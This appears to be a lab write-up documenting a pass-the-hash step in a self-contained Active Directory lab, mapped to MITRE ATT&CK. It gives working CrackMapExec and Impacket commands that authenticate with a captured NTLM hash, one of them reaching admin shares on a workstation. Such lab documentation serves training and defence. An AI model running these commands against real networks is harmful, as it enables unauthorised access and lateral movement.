# Phase 3 — Pass-the-Hash (PtH)

## Overview
Pass-the-Hash is a lateral movement technique where an attacker uses a captured 
NTLM hash to authenticate to remote systems without knowing the plaintext password.
In this phase, the NTLM hash of svc-mssql (obtained from Phase 2) was used to 
authenticate to WORKSTATION01 and DC01 via SMB.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Lateral Movement, Defense Evasion |
| Technique | T1550.002 — Pass the Hash |
| Sub-technique | T1078.002 — Domain Accounts |

## Environment
| Component | Details |
|---|---|
| Attacker | Kali Linux (10.0.0.99) |
| Target 1 | DC01 — Windows Server 2022 (10.0.0.10) |
| Target 2 | WORKSTATION01 — Windows 10 Pro (10.0.0.30) |
| Tools | CrackMapExec, Impacket smbclient.py |
| Hash Source | Phase 2 — svc-mssql cracked password: Password1 |

## Attack Steps

### 1. Generate NTLM Hash from Plaintext Password
```bash
python3 -c "import hashlib; print(hashlib.new('md4', 'Password1'.encode('utf-16le')).hexdigest())"
# Result: 64f12cddaa88057e06a81b54e73b949b
```

### 2. Verify Hash on DC01 with CrackMapExec
```bash
crackmapexec smb 10.0.0.10 -u svc-mssql -H 64f12cddaa88057e06a81b54e73b949b -d SOC.local
# Result: [+] SOC.local\svc-mssql:64f12cddaa88057e06a81b54e73b949b
```

### 3. SMB Lateral Movement to WORKSTATION01
```bash
python3 smbclient.py -hashes :64f12cddaa88057e06a81b54e73b949b SOC.local/svc-mssql@10.0.0.30
# Accessible shares: ADMIN$, C$, IPC$
```

